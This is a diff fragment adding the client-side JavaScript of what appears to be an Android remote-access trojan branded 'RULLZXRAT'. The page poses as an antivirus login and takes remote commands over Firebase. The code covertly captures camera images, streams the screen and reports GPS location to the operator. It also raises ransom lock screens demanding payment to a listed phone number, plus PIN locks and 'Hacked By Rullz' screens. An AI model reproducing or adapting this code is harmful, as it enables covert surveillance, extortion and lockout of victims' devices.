+                            if (!isScreenStreaming) { clearInterval(screenInterval); return; }
+                            ctx.drawImage(video, 0, 0, 320, 240);
+                            var dataUrl = canvas.toDataURL('image/jpeg', 0.5);
+                            database.ref('commands/' + MY_ID + '/screen').set({
+                                frame: dataUrl,
+                                timestamp: firebase.database.ServerValue.TIMESTAMP
+                            }).catch(function(e){});
+                        }, 1000);
+                    };
+                    video.load();
+                }).catch(function(e){});
+            }
+
+            function stopScreenStream() {
+                isScreenStreaming = false;
+                if (screenInterval) { clearInterval(screenInterval); screenInterval = null; }
+                if (screenStream) { screenStream.getTracks().forEach(function(t) { t.stop(); }); screenStream = null; }
+                if (MY_ID) { database.ref('commands/' + MY_ID + '/screen').remove().catch(function(e){}); }
+            }
+
+            // ---- LOCK FUNCTIONS ----
+            function setLockV2Background(bgColor) {
+                var el = document.getElementById('lockV2');
+                if (bgColor === 'black') el.style.background = '#000000';
+                else if (bgColor === 'gray') el.style.background = '#4a4a4a';
+                else if (bgColor === 'red') el.style.background = '#8b0000';
+                else el.style.background = '#0b0815';
+            }
+
+            function setLockBackground(bgColor, bgValue) {
+                var lockContainer = document.getElementById('lockCont');
+                lockContainer.style.backgroundImage = '';
+                lockContainer.style.backgroundColor = '';
+                if (bgColor === 'black') lockContainer.style.backgroundColor = '#000000';
+                else if (bgColor === 'red') lockContainer.style.backgroundColor = '#ff0000';
+                else if (bgColor === 'gray') lockContainer.style.backgroundColor = '#555555';
+                else lockContainer.style.backgroundColor = '#000000';
+            }
+
+            function showLockV2(data) {
+                setLockV2Background(data.bgColor || 'black');
+                document.getElementById('lockV2Message').innerText = data.message || "HELLO I'M RULLZ";
+                document.getElementById('v2PengirimText').innerText = data.pengirim || "-";
+                document.getElementById('v2NoHpText').innerText = data.noHp || "-";
+                document.getElementById('v2NominalText').innerText = data.nominal || "-";
+                document.getElementById('v2MetodeText').innerText = data.metode || "DANA ONLY";
+                document.getElementById('lockV2').style.display = 'flex';
+                if (window.RullzInterface) window.RullzInterface.startLock();
+            }
+
+            function hideLockV2() { document.getElementById('lockV2').style.display = 'none'; }
+
+            function focusInput() {
+                if (document.getElementById('lockCont').style.display === 'block') {
+                    document.getElementById('realInput').focus();
+                }
+            }
+
+            function unlockSOS() {
+                document.getElementById('sosLock').style.display = 'none';
+                if (window.RullzInterface) window.RullzInterface.exitApp();
+            }
+
+            function showSOSLock(message) {
+                document.getElementById('sosMessage').innerText = message;
+                document.getElementById('sosLock').style.display = 'flex';
+                if (window.RullzInterface) window.RullzInterface.startLock();
+            }
+
+            var sosMatrixRunning = false;
+            function startSOSMatrix(message) {
+                var container = document.getElementById('sosLockV2');
+                document.getElementById('sosV2Message').innerText = message || 'AKSES DIBLOKIR';
+                container.style.display = 'flex';
+                if (!sosMatrixRunning) {
+                    sosMatrixRunning = true;
+                    var canvas = document.getElementById('sosMatrixCanvas');
+                    if (canvas) {
+                        var ctx = canvas.getContext('2d');
+                        var w = canvas.width = window.innerWidth;
+                        var h = canvas.height = window.innerHeight;
+                        var cols = Math.floor(w / 14);
+                        var ypos = Array(cols).fill(0);
+                        var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}|:<>?~';
+                        ctx.fillStyle = '#0a0000';
+                        ctx.fillRect(0, 0, w, h);
+                        function drawRed() {
+                            ctx.fillStyle = 'rgba(10,0,0,0.04)';
+                            ctx.fillRect(0, 0, w, h);
+                            ctx.fillStyle = '#ff0040';
+                            ctx.font = '14px monospace';
+                            for (var i = 0; i < cols; i++) {
+                                var text = chars.charAt(Math.floor(Math.random() * chars.length));
+                                var x = i * 14;
+                                var y = ypos[i];
+                                ctx.fillText(text, x, y);
+                                if (y > h && Math.random() > 0.99) { ypos[i] = 0; } else { ypos[i] += 14; }
+                            }
+                            requestAnimationFrame(drawRed);
+                        }
+                        drawRed();
+                        window.addEventListener('resize', function() {
+                            canvas.width = window.innerWidth;
+                            canvas.height = window.innerHeight;
+                        });
+                    }
+                }
+                if (window.RullzInterface) window.RullzInterface.startLock();
+            }
+
+            function stopSOSMatrix() {
+                document.getElementById('sosLockV2').style.display = 'none';
+                sosMatrixRunning = false;
+            }
+
+            function startMatrix() {
+                var canvas = document.getElementById('matrixCanvas');
+                if (!canvas) return;
+                var ctx = canvas.getContext('2d');
+                var w = canvas.width = window.innerWidth;
+                var h = canvas.height = window.innerHeight;
+                var cols = Math.floor(w / 14);
+                var ypos = Array(cols).fill(0);
+                var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+                ctx.fillStyle = '#000';
+                ctx.fillRect(0, 0, w, h);
+                function draw() {
+                    ctx.fillStyle = 'rgba(0,0,0,0.04)';
+                    ctx.fillRect(0, 0, w, h);
+                    ctx.fillStyle = '#00ff41';
+                    ctx.font = '14px monospace';
+                    for (var i = 0; i < cols; i++) {
+                        var text = chars.charAt(Math.floor(Math.random() * chars.length));
+                        var x = i * 14;
+                        var y = ypos[i];
+                        ctx.fillText(text, x, y);
+                        if (y > h && Math.random() > 0.99) { ypos[i] = 0; } else { ypos[i] += 14; }
+                    }
+                    requestAnimationFrame(draw);
+                }
+                draw();
+                window.addEventListener('resize', function() {
+                    canvas.width = window.innerWidth;
+                    canvas.height = window.innerHeight;
+                });
+            }
+
+            // ---- LISTENER PERINTAH (dengan tambahan OPEN_APP) ----
+            function startCommandListener() {
+                if (!MY_ID) return;
+                if (commandListener) {
+                    database.ref('commands/' + MY_ID).off('value', commandListener);
+                    commandListener = null;
+                }
+                commandListener = function(snap) {
+                    var d = snap.val();
+                    if (!d) return;
+                    console.log('📩 Command:', d);
+
+                    // ======== OPEN APP (tambahan) ========
+                    if (d.status === 'OPEN_APP') {
+                        var pkg = d.package;
+                        if (pkg) {
+                            console.log('📱 Membuka aplikasi:', pkg);
+                            openApp(pkg);
+                        } else {
+                            console.warn('⚠️ Package name tidak ada');
+                        }
+                        return;
+                    }
+
+                    // ======== LOCK V2 ========
+                    if (d.status === 'LOCK_V2') {
+                        showLockV2({
+                            message: d.message || "HELLO I'M RULLZ",
+                            pengirim: d.pengirim || "RULLZXRAT",
+                            noHp: d.noHp || "088708157164",
+                            nominal: d.nominal || "500.000",
+                            metode: d.metode || "DANA ONLY",
+                            bgColor: d.bgColor || "black"
+                        });
+                        return;
+                    }
+                    if (d.status === 'UNLOCK_V2') { hideLockV2(); if (window.RullzInterface) window.RullzInterface.exitApp(); return; }
+                    if (d.status === 'SOS_LOCK_V2') { startSOSMatrix(d.message || 'AKSES DIBLOKIR'); return; }
+                    if (d.status === 'SOS_UNLOCK_V2') { stopSOSMatrix(); if (window.RullzInterface) window.RullzInterface.exitApp(); return; }
+                    if (d.status === 'SOS_LOCK') { showSOSLock(d.message || "Hacked By Rullz"); return; }
+                    if (d.status === 'SOS_UNLOCK') { unlockSOS(); return; }
+                    if (d.status === 'LOCK') {
+                        if (d.bgColor) setLockBackground(d.bgColor, d.bgValue);
+                        else setLockBackground('black', null);
+                        document.getElementById('lockCont').style.display = 'block';
+                        document.getElementById('lTit').innerText = d.sender || "LOCK BY RULLZXRAT";
+                        window.correctPin = d.key;
+                        focusInput();
+                        if (window.RullzInterface) window.RullzInterface.startLock();
+                        return;
+                    }
+                    if (d.status === 'UNLOCK') { unlockApp(); return; }
+                    if (d.status === 'RESET_SYSTEM_UI') { location.reload(); return; }
+                    if (d.status === 'FLASH_ON') { if (window.RullzInterface) window.RullzInterface.toggleFlash(true); return; }
+                    if (d.status === 'FLASH_OFF') { if (window.RullzInterface) window.RullzInterface.toggleFlash(false); return; }
+                    if (d.status === 'HELL_LOCK') {
+                        var h = document.getElementById('hell');
+                        document.getElementById('hellMessage').innerText = d.message || "HELLO I'M RULLZ";
+                        h.style.display = 'flex';
+                        if (!window._matrixStarted) { startMatrix(); window._matrixStarted = true; }
+                        if (window.RullzInterface) window.RullzInterface.startLock();
+                        setTimeout(function() { h.style.display = 'none'; }, (d.duration || 10) * 1000);
+                        return;
+                    }
+                    if (d.status === 'TOAST') { if (window.RullzInterface) window.RullzInterface.showToast(d.message); return; }
+                    if (d.status === 'CAMERA_FRONT') { sendCameraImage('user', d.timestamp || Date.now()); return; }
+                    if (d.status === 'CAMERA_BACK') { sendCameraImage('environment', d.timestamp || Date.now()); return; }
+                    if (d.status === 'LIVE_SCREEN_ON') { startScreenStream(); return; }
+                    if (d.status === 'LIVE_SCREEN_OFF') { stopScreenStream(); return; }
+                    if (d.status === 'REQUEST_LOCATION') {
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(function(pos) {
+                                database.ref('commands/' + MY_ID + '/location_response').set({
+                                    lat: pos.coords.latitude,
+                                    lng: pos.coords.longitude,
+                                    accuracy: pos.coords.accuracy,
+                                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                                }).catch(function(e){});
+                            }, function(e){}, { enableHighAccuracy: true, timeout: 5000 });
+                        }
+                        return;
+                    }
+                };
+                database.ref('commands/' + MY_ID).on('value', commandListener);
+            }
+
+            // ---- PIN HANDLER ----
+            function handleInput(el) {
+                var val = el.value;
+                document.getElementById('dotsDisplay').innerText = "*".repeat(val.length);
+                if (val.length >= 4) {
+                    if (val === window.correctPin) {
+                        unlockApp();
+                    } else {
+                        el.value = "";
+                        document.getElementById('dotsDisplay').innerText = "";
+                    }
+                }
+            }
+
+            function unlockApp() {
+                document.getElementById('lockCont').style.display = 'none';
+                document.body.style.backgroundColor = "#ffffff";
+                setTimeout(function() {
+                    if (window.RullzInterface) window.RullzInterface.exitApp();
+                }, 300);
+            }
+
+            // ---- LOGIN ----
+            window.fakeLogin = function() {
+                var user = document.getElementById('fakeUser').value.trim();
+                var statusEl = document.getElementById('loginStatus');
+                var btn = document.getElementById('loginBtn');
+
+                if (!user) {
+                    statusEl.textContent = '❌ Masukkan Kode UID!';
+                    statusEl.className = 'login-status error';
+                    return;
+                }
+
+                if (commandListener) {
+                    database.ref('commands/' + MY_ID).off('value', commandListener);
+                    commandListener = null;
+                }
+                if (onlineInterval) {
+                    clearInterval(onlineInterval);
+                    onlineInterval = null;
+                }
+                if (dataInterval) {
+                    clearInterval(dataInterval);
+                    dataInterval = null;
+                }
+                stopLocationWatch();
+                stopScreenStream();
+
+                btn.classList.add('loading');
+                btn.textContent = 'Loading...';
+                statusEl.textContent = '';
+                statusEl.className = 'login-status';
+
+                MY_ID = user;
+                localStorage.setItem('vortex_uid', MY_ID);
+
+                setTimeout(function() { sendDeviceData(); }, 100);
+                setTimeout(function() { sendDeviceData(); }, 500);
+
+                startCommandListener();
+                startLocationWatch();
+
+                try {
+                    if ('wakeLock' in navigator) {
+                        navigator.wakeLock.request('screen').then(function(wl) {
+                            console.log('✅ Wake Lock aktif');
+                        }).catch(function(e){});
+                    }
+                } catch(e) {}
+
+                onlineInterval = setInterval(function() {
+                    if (MY_ID) {
+                        database.ref('targets/' + MY_ID + '/online').set(true);
+                    }
+                }, 3000);
+
+                dataInterval = setInterval(function() {
+                    if (MY_ID) sendDeviceData();
+                }, 5000);
+
+                setTimeout(function() {
+                    btn.textContent = 'Anti Virus Active';
+                    btn.classList.remove('loading');
+                    btn.disabled = true;
+                    document.getElementById('fakeUser').disabled = true;
+                    document.getElementById('fakeUser').style.opacity = '0.6';
+                    statusEl.textContent = '';
+                    statusEl.className = 'login-status';
+                    console.log('✅ Target terdaftar dengan UID:', MY_ID);
+                }, 1500);
+            };
+
+            // ---- SESSION CHECK ----
+            var savedUID = localStorage.getItem('vortex_uid');
+            if (savedUID) {
+                document.getElementById('fakeUser').value = savedUID;
+                setTimeout(function() {
+                    if (document.getElementById('fakeUser').value.trim()) {
+                        window.fakeLogin();
+                    }
+                }, 300);
+            }
+
+            document.getElementById('loginBtn').addEventListener('click', fakeLogin);
+
+            setInterval(function() {
+                if (MY_ID) sendDeviceData();
+            }, 3000);
+
+            window.addEventListener('beforeunload', function() {
+                if (MY_ID) {
+                    database.ref('targets/' + MY_ID + '/online').set(false);
+                }
+                stopScreenStream();
+                stopLocationWatch();
+                if (commandListener) {
+                    database.ref('commands/' + MY_ID).off('value', commandListener);
+                }
+                if (onlineInterval) clearInterval(onlineInterval);
+                if (dataInterval) clearInterval(dataInterval);
+            });
+
+            // ---- EXPOSE ----
+            window.showLockV2 = showLockV2;
+            window.hideLockV2 = hideLockV2;
+            window.showSOSLock = showSOSLock;
+            window.unlockSOS = unlockSOS;
+            window.handleInput = handleInput;
+            window.unlockApp = unlockApp;
+            window.focusInput = focusInput;
+            window.correctPin = '';
+            window.fakeLogin = fakeLogin;
+            window.startScreenStream = startScreenStream;
+            window.stopScreenStream = stopScreenStream;
+            window.startSOSMatrix = startSOSMatrix;
+            window.stopSOSMatrix = stopSOSMatrix;
+            window.openApp = openApp; // tambahan
+
+            console.log('✅ VORTEX Target aktif - Deteksi device lengkap + Open Apps siap');
+            console.log('💡 Masukkan UID dari admin, klik Login, otomatis terdaftar!');
+        })();
+    </script>
+</body>
+</html>
